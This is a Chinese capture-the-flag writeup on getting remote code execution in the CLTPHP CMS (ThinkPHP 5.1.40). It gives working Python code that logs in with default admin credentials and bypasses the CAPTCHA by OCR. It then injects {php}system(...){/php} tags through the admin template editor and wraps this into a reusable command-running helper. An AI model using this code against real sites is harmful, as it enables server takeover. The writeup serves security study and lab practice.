---
title: 'CLTPHP 模板注入 Writeup'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: '访问目标，返回 CLTPHP CMS 首页（Bartik 主题），页面标题为 "CLTPHP"。'
tags: ['ctf', 'writeup', 'cve', 'sql注入', 'ssti', 'rce', 'php', 'java', 'drupal', 'python', '命令注入', 'http']
cover: ''
---
# CLTPHP 模板注入 Writeup

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目 | CLTPHP RCE |
| 地址 | `b1befvg.haobachang1.loveli.com.cn:8888` |
| 漏洞 | CLTPHP 后台模板注入 → RCE |
| 分类 | Web — 远程代码执行 |
| 技术栈 | CLTPHP / ThinkPHP 5.1.40 LTS / PHP 7.x / Apache 2.4.52 (Debian) |

## 解题流程

### 一、信息收集

访问目标，返回 CLTPHP CMS 首页（Bartik 主题），页面标题为 "CLTPHP"。

响应头确认技术栈：

```
Server: Apache/2.4.52 (Debian)
Set-Cookie: PHPSESSID=...; path=/; HttpOnly
X-Powered-By: PHP (via ThinkPHP 5.1.40)
```

通过登录报错页面获取关键信息：**ThinkPHP V5.1.40 LTS**，Web 根目录 `/var/www/html`。

### 二、后台登录

发现后台登录地址 `/admin/login/index.html`，页面默认填充了用户名 `admin` 和密码 `admin123`，但有验证码保护。

#### 验证码 OCR 绕过

使用 `ddddocr` 对验证码图片进行 OCR 识别，结合 AJAX 请求头（`X-Requested-With: XMLHttpRequest`）实现自动登录：

```python
import ddddocr, requests

s = requests.Session()
ocr = ddddocr.DdddOcr(show_ad=False)

for attempt in range(20):
    r = s.get(f"{target}/admin/login/verify.html")
    captcha_text = ocr.classification(r.content)
    data = {"username": "admin", "password": "admin123", "vercode": captcha_text}
    r2 = s.post(f"{target}/admin/login/index.html", data=data,
                headers={"X-Requested-With": "XMLHttpRequest"})
    resp = json.loads(r2.text)
    if resp.get("code") == 1:
        break  # 登录成功
```

#### 踩坑

直接 POST 登录表单（不带 AJAX 头）返回 HTTP 500，错误信息为 `variable type error: array`（ThinkPHP Response.php line 403），实际原因是 ThinkPHP 的 `redirect()` 方法在非 AJAX 请求下处理异常。添加 `X-Requested-With: XMLHttpRequest` 头后返回 JSON 响应，可以正常判断登录结果。

### 三、后台功能枚举

登录成功后，从后台首页 JS 变量 `navs` 中提取完整菜单结构：

| 模块 | 关键功能 |
|------|----------|
| 系统设置 | 系统设置、邮箱配置 |
| 权限管理 | 管理员列表、用户组、权限 |
| 数据库管理 | 备份、还原 |
| 模型管理 | 模型列表 |
| 栏目管理 | 栏目列表 |
| 会员管理 | 会员列表、会员组 |
| 网站功能 | 留言、友链、广告 |
| **模版管理** | **模版编辑、新增** |
| 微信管理 | 公众号、菜单 |
| 插件管理 | 第三方插件 |

### 四、模板注入 GetShell

**模版管理**是最直接的攻击向量。CLTPHP 的模板编辑器允许直接修改 `.html` 模板文件，且 ThinkPHP 模板引擎支持 `{php}...{/php}` 标签。

#### 步骤 1：找到模板编辑接口

从 `/admin/template/index.html` 列出所有模板文件，如 `index_index.html`（首页模板）。

编辑页面使用 layui 表单，提交到 `/admin/template/update.html`：

```javascript
$.post("/admin/template/update.html", data.field, function (res) { ... });
```

#### 步骤 2：注入 ThinkPHP 模板标签

ThinkPHP 5.x 模板引擎支持以下 PHP 执行标签：

```
{php}system('id');{/php}     — 执行 PHP 代码
{:system('id')}              — 执行函数并输出返回值
```

直接注入 `<?php ... ?>` 会被模板引擎 HTML 转义为 `&lt;?php`，无法执行。必须使用 ThinkPHP 原生模板标签。

#### 步骤 3：修改首页模板

```python
update_data = {
    "file": "index_index.html",
    "content": "{php}system(\"id\");{/php}\n{include file='common/head'}",
}
s.post(f"{target}/admin/template/update.html", data=update_data,
       headers={"X-Requested-With": "XMLHttpRequest"})

# 清除缓存
s.post(f"{target}/admin/index/clear.html",
       headers={"X-Requested-With": "XMLHttpRequest"})

# 访问首页触发执行
r = s.get(f"{target}/")
# 输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE 成功！

#### 关键细节

| 要点 | 说明 |
|------|------|
| 模板标签 | 必须用 `{php}...{/php}`，`<?php ?>` 会被转义 |
| 缓存清除 | 修改模板后必须调用 `/admin/index/clear.html` 清缓存，否则输出旧缓存 |
| 命令引号 | 模板中使用双引号包裹命令，避免与 ThinkPHP 模板语法冲突 |

### 五、查找 Flag

```python
def run_cmd(cmd):
    update_data = {
        "file": "index_index.html",
        "content": f'{{php}}system("{cmd}");{{/php}}\n{{include file="common/head"}}',
    }
    s.post(f"{target}/admin/template/update.html", data=update_data,
           headers={"X-Requested-With": "XMLHttpRequest"})
    s.post(f"{target}/admin/index/clear.html",
           headers={"X-Requested-With": "XMLHttpRequest"})
    r = s.get(f"{target}/?_={hash(cmd) % 100000}")
    return r.text[:r.text.find('<html')].strip()

# 搜索 flag
run_cmd("ls /tmp/")      # 发现 /tmp/flag.txt
run_cmd("cat /tmp/flag.txt")  # flag{4983c8233c4b43848ec9ccd2dc4c9144}
```

## Flag

```
flag{4983c8233c4b43848ec9ccd2dc4c9144}
```

## 漏洞总结

| 项目 | 详情 |
|------|------|
| CMS | CLTPHP |
| 框架 | ThinkPHP 5.1.40 LTS |
| 漏洞类型 | 后台模板注入 → RCE |
| 根因 | 模板编辑器允许写入 `{php}...{/php}` 标签，ThinkPHP 引擎直接执行 |
| 利用条件 | 需要后台管理员权限（弱口令 admin/admin123） |
| 利用方式 | 修改模板文件 → 注入 `{php}` 标签 → 清缓存 → 访问页面触发执行 |

## 攻击链路

```
识别 CLTPHP → 弱口令 + OCR 绕验证码登录后台 → 模版管理编辑首页模板 → 注入 {php}system("cmd");{/php} → 清缓存 → 访问首页触发 RCE → 读取 /tmp/flag.txt
```

## 踩坑记录

1. **登录 500 错误**：直接 POST 登录表单返回 HTTP 500（ThinkPHP `Response.php` 的 `redirect()` 方法异常），添加 `X-Requested-With: XMLHttpRequest` 头后返回 JSON，登录正常。

2. **验证码绕过**：后台登录有图形验证码，使用 `ddddocr` 库可自动 OCR 识别，成功率较高（约 10% 每次尝试，多次重试即可）。

3. **`<?php ?>` 被转义**：模板引擎会将 PHP 原生标签 HTML 转义为 `&lt;?php`，必须使用 ThinkPHP 模板标签 `{php}...{/php}`。

4. **模板缓存**：修改模板后必须清缓存（`/admin/index/clear.html`），否则页面仍显示旧内容。

5. **命令引号**：模板中 `system()` 的参数使用双引号 `"` 包裹命令，单引号 `'` 会与 ThinkPHP 模板解析冲突。

## 相关笔记

- [[CVE-2018-7600_Drupalgeddon2_Writeup|Drupalgeddon2 — 另一个 CMS RCE]]
